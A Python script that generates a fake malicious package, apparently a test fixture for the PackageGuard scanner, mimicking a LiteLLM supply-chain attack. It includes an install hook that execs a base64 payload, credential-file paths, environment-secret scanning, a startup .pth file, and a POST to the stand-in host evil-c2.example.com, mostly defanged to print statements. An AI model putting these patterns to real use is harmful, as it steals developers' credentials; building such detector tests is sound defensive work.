"""
DEMO ONLY — Fake malicious package that mimics TeamPCP LiteLLM attack patterns.
This is harmless but triggers all PackageGuard detectors.

DO NOT use this outside of demo/testing context.
"""

# ── setup.py for demo-litellm-evil ──
SETUP_PY = '''
import os
import base64
import subprocess
from setuptools import setup, find_packages
from setuptools.command.install import install

# MALICIOUS PATTERN: Base64-encoded payload in setup.py
_PAYLOAD = base64.b64encode(b"""
import os
import json

# MALICIOUS PATTERN: Credential harvesting (harmless demo version)
SENSITIVE_PATHS = [
    os.path.expanduser("~/.ssh/id_rsa"),
    os.path.expanduser("~/.aws/credentials"),
    os.path.expanduser("~/.env"),
    "/etc/passwd",
]

harvested = {}
for path in SENSITIVE_PATHS:
    if os.path.exists(path):
        harvested[path] = "EXISTS (would read in real attack)"

# MALICIOUS PATTERN: Exfiltration attempt (harmless — prints instead of sending)
print("[DEMO] Would exfiltrate to: https://evil-c2.example.com/collect")
print(f"[DEMO] Found {len(harvested)} sensitive files")

# MALICIOUS PATTERN: Persistence via systemd (harmless — just prints)
print("[DEMO] Would install systemd service at ~/.config/systemd/user/sysmon.service")
""").decode()


class MaliciousInstall(install):
    """MALICIOUS PATTERN: Overridden install command."""
    def run(self):
        install.run(self)
        # Would execute payload here
        exec(base64.b64decode(_PAYLOAD))


setup(
    name="demo-litellm-evil",
    version="0.0.1",
    description="",
    packages=find_packages(),
    cmdclass={"install": MaliciousInstall},
)
'''

# ── .pth file (the key LiteLLM attack vector) ──
PTH_FILE = '''
# MALICIOUS PATTERN: .pth file that executes on every Python startup
import subprocess; subprocess.Popen(["python", "-c", "print('[DEMO] .pth file executed on Python startup')"])
'''

# ── Main module with suspicious patterns ──
INIT_PY = '''
"""Demo package — mimics malicious patterns for PackageGuard testing."""
import os
import socket
import http.client
import base64
import zlib

# MALICIOUS PATTERN: Obfuscated code (double base64)
_hidden = base64.b64encode(base64.b64encode(b"print('harmless demo payload')")).decode()

# MALICIOUS PATTERN: Network callback
def _callback():
    try:
        # Would connect to C2 server
        conn = http.client.HTTPSConnection("evil-c2.example.com", timeout=1)
        conn.request("POST", "/collect", body="demo_data")
    except Exception:
        pass

# MALICIOUS PATTERN: Read environment variables for secrets
def _harvest_env():
    interesting = {}
    for key in os.environ:
        if any(s in key.upper() for s in ["KEY", "SECRET", "TOKEN", "PASSWORD", "AWS", "AZURE"]):
            interesting[key] = "REDACTED"
    return interesting
'''


def create_demo_package(output_dir: str):
    """Create the demo malicious package files in output_dir."""
    import os
    os.makedirs(output_dir, exist_ok=True)
    os.makedirs(os.path.join(output_dir, "demo_litellm_evil"), exist_ok=True)

    with open(os.path.join(output_dir, "setup.py"), "w") as f:
        f.write(SETUP_PY)

    with open(os.path.join(output_dir, "demo_litellm_evil.pth"), "w") as f:
        f.write(PTH_FILE)

    with open(os.path.join(output_dir, "demo_litellm_evil", "__init__.py"), "w") as f:
        f.write(INIT_PY)

    print(f"Demo malicious package created in: {output_dir}")
    return output_dir


if __name__ == "__main__":
    import sys
    out = sys.argv[1] if len(sys.argv) > 1 else "./demo_pkg_output"
    create_demo_package(out)
